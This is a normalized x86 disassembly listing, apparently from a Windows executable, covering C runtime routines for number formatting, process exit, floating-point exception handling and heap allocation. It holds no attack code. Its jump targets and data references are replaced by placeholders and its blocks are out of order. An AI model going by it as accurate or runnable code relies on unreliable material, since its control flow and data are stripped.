neg eax
mov [ ecx ] 0x2d
inc ecx
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop esi
idiv esi
add [ ecx ] al
mov eax edx
add [ ecx + 0x1 ] al
cdq
push 0xa
pop esi
idiv esi
add [ ecx ] al
mov eax edx
sub_4b8342
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_4bb826
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + 0x1 ]
push eax
xor eax eax
cmp [ ebp - 0x14 ] 0x2d
mov edx ebx
sete al
xor ecx ecx
test esi esi
setg cl
add edx eax
add ecx edx
push ecx
call sub_4bb6f5
push 0x0
push [ ebp + 0x14 ]
lea eax [ ebp - 0x14 ]
push esi
call sub_4b8294
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x28
pop esi
mov eax ebx
pop ebx
call sub_4bb8c9
leave
retn
sub_4b83b6
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
dec eax
cmp [ ebp + 0x10 ] 0x0
push edi
je r-xdata
cmp [ esi ] 0x2d
mov ebx [ ebp + 0x8 ]
jne r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ esi + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
inc ebx
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx [ ebp + 0x8 ]
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
add ebx eax
mov eax ebx
call sub_4b8277
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4b8277
mov al [ rw-data ]
mov [ ebx ] al
mov esi [ esi + 0x4 ]
inc ebx
test esi esi
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
neg esi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] esi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_4b8277
push edi
push 0x30
push ebx
call sub_4ba340
add esp 0xc
sub_4b8452
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push esi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_4bb826
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
add eax esi
push eax
xor eax eax
cmp [ ebp - 0x14 ] 0x2d
sete al
add eax [ ebp + 0xc ]
push eax
call sub_4bb6f5
push 0x0
push esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
call sub_4b83b6
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
mov eax [ ebp + 0xc ]
add esp 0x28
pop esi
call sub_4bb8c9
leave
retn
sub_4b84ba
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
push esi
mov [ ebp - 0x4 ] eax
push edi
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_4bb826
mov esi [ ebp - 0x10 ]
mov ebx [ ebp + 0x10 ]
xor eax eax
dec esi
cmp [ ebp - 0x14 ] 0x2d
sete al
add eax [ ebp + 0xc ]
mov edi eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
push edi
call sub_4bb6f5
mov eax [ ebp - 0x10 ]
add esp 0x1c
dec eax
cmp esi eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
push 0x1
push [ ebp + 0x14 ]
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
call sub_4b8294
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
push 0x1
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
call sub_4b83b6
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0xc
pop edi
pop esi
pop ebx
call sub_4bb8c9
leave
retn
and [ edi - 0x2 ] al
sub_4b855a
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b8342
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b84ba
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4b8452
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_4b85bd
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_4b85fd
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_4b85bd
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_4b8626
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_4b8668
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push edi
mov ecx rw-data
mov edi rw-data
xor eax eax
cmp ecx edi
mov esi ecx
jae r-xdata
call eax
push sub_4babf2
call sub_4b6619
mov esi rw-data
mov eax esi
mov edi rw-data
cmp eax edi
pop ecx
jae r-xdata
test eax eax
jne r-xdata
xor eax eax
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
add esi 0x4
cmp esi edi
jb r-xdata
call ecx
test eax eax
jne r-xdata
sub_4b86cd
push ebp
mov ebp esp
push esi
push edi
push 0x8
call sub_4b80da
xor esi esi
inc esi
cmp [ rw-data ] esi
pop ecx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
mov al [ ebp + 0x10 ]
mov [ rw-data ] esi
mov [ rw-data ] al
jne r-xdata
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov eax rw-data
mov esi rw-data
cmp eax esi
mov edi eax
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax rw-data
mov esi rw-data
cmp eax esi
mov edi eax
jae r-xdata
mov eax [ rw-data ]
sub eax 0x4
cmp eax ecx
jmp r-xdata
push [ ebp + 0x8 ]
mov [ rw-data ] 0x1
call sub_4b8626
push 0x8
call sub_4b8046
jmp r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
mov eax [ edi ]
test eax eax
je r-xdata
mov [ rw-data ] eax
jae r-xdata
pop ecx
pop ebp
retn
add edi 0x4
cmp edi esi
jb r-xdata
call eax
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax 0x4
cmp eax [ rw-data ]
call eax
sub_4b87e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call sub_4b7c13
mov edi [ ebp + 0x8 ]
mov esi eax
mov edx [ esi + 0x54 ]
mov eax [ rw-data ]
mov ecx edx
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
cmp ecx eax
jae r-xdata
lea ebx [ eax + eax * 2 ]
add ecx 0xc
lea ebx [ edx + ebx * 4 ]
cmp ecx ebx
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ ecx + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x58 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x58 ] eax
mov eax [ ecx + 0x4 ]
cmp eax 0x8
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ecx + 0x8 ] 0x0
push eax
call ebx
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
cmp edx eax
jge r-xdata
mov ecx [ ecx ]
cmp ecx 0xc000008e
mov edi [ esi + 0x5c ]
jne r-xdata
lea eax [ edx + edx * 2 ]
shl eax 0x2
cmp ecx 0xc0000090
jne r-xdata
mov [ esi + 0x5c ] 0x83
jmp r-xdata
mov edi [ esi + 0x54 ]
and [ eax + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add eax 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp ecx 0xc0000091
jne r-xdata
mov [ esi + 0x5c ] 0x81
jmp r-xdata
push [ esi + 0x5c ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x5c ] edi
jmp r-xdata
cmp ecx 0xc0000093
jne r-xdata
mov [ esi + 0x5c ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
mov [ esi + 0x58 ] eax
cmp ecx 0xc000008d
jne r-xdata
mov [ esi + 0x5c ] 0x85
jmp r-xdata
cmp ecx 0xc000008f
jne r-xdata
mov [ esi + 0x5c ] 0x82
jmp r-xdata
cmp ecx 0xc0000092
jne r-xdata
mov [ esi + 0x5c ] 0x86
jmp r-xdata
mov [ esi + 0x5c ] 0x8a
sub_4b8944
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4b89a2
push esi
call sub_4b7c13
mov ecx [ esp + 0x8 ]
mov [ eax + 0xc ] ecx
xor esi esi
call sub_4b7c13
mov ecx [ esi * 8 + rw-data ]
mov [ eax + 0x8 ] ecx
pop esi
retn
inc esi
cmp esi 0x2d
jb r-xdata
cmp ecx [ esi * 8 + rw-data ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_4b7c13
mov [ eax + 0x8 ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_4b7c13
mov [ eax + 0x8 ] 0xd
pop esi
retn
call sub_4b7c13
mov [ eax + 0x8 ] 0x8
pop esi
retn
sub_4b8a15
push 0x14
push r--data
call sub_4b8944
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
push [ ebp + 0xc ]
call sub_4b66db
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push edi
call sub_4b66ed
pop ecx
jmp r-xdata
call sub_4b897f
retn
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
cmp eax ebx
jne r-xdata
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp eax ebx
jne r-xdata
push 0x4
call sub_4b80da
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_4b8ceb
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push esi
push edi
push ebx
push [ rw-data ]
call [ HeapReAlloc@IAT ]
xor esi esi
inc esi
cmp [ rw-data ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4b8b7d
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push esi
call sub_4b6e9a
pop ecx
test eax eax
jne r-xdata
push esi
call sub_4b6e9a
pop ecx
test eax eax
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push esi
push edi
push eax
call sub_4b91eb
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push ebx
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x1c ] eax
xor esi esi
inc esi
cmp esi ebx
jne r-xdata
push esi
call sub_4b94ca
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] edi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ edi - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
cmp eax esi
jb r-xdata
mov eax [ edi - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
cmp eax esi
jb r-xdata
push eax
push edi
push [ ebp - 0x1c ]
call sub_4b6f50
push edi
call sub_4b8ceb
mov [ ebp - 0x20 ] eax
push edi
push eax
call sub_4b8d16
add esp 0x18
mov eax esi
push eax
push edi
push [ ebp - 0x1c ]
call sub_4b6f50
push edi
push [ ebp - 0x20 ]
call sub_4b8d16
add esp 0x14
mov eax esi
sub_4b8bc2
push 0x10
push r--data
call sub_4b8944
cmp [ rw-data ] 0x3
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
push esi
call sub_4b8ceb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x20 ]
mov esi [ esi - 0x4 ]
sub esi 0x9
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov eax esi
call sub_4b897f
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_4b8c2f
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
sub_4b8c52
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_4b8c38
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
inc eax
retn
push 0x3f8
call sub_4b8ca3
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_4b8ca3
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_4b8ceb
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_4b8d16
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4b5890
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4b902e
mov eax [ rw-data ]
mov ecx [ rw-data ]
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push esi
push 0x41c4
push 0x8
push [ rw-data ]
lea eax [ eax + eax * 4 ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
jne r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
xor eax eax
pop edi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
pop esi
pop edi
retn
sub_4b90e5
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
shl eax 0x1
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_4b91eb
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
